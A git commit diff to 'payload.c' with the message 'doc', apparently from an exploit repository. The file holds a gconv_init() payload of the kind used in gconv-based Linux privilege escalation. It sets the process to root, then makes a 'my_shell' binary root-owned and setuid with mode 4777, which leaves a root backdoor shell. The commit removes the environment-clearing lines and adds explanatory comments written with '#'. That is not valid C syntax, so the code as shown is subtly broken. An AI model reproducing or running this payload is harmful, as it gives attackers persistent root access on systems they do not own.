b266a67786f41c7044c0e37f48eb63d4ccf466fd
LDRMoliner <molinamikel0404@gmail.com>
2025-04-14 03:06:29 +0200

    doc

--- payload.c
+++ payload.c
@@ -3,12 +3,13 @@
 #include <gconv.h>
 
 int gconv_init() {
+
+    # We set the id and group of the process to root.
+
     setuid(0);
     setgid(0);
-
-    clearenv();
-    putenv("PATH=/usr/bin");
     
+    # We make the utility as if it were from root, we also set the bit setuid as root. 
     system("/usr/bin/chown root my_shell");
     system("/usr/bin/chmod 4777 my_shell");
 }
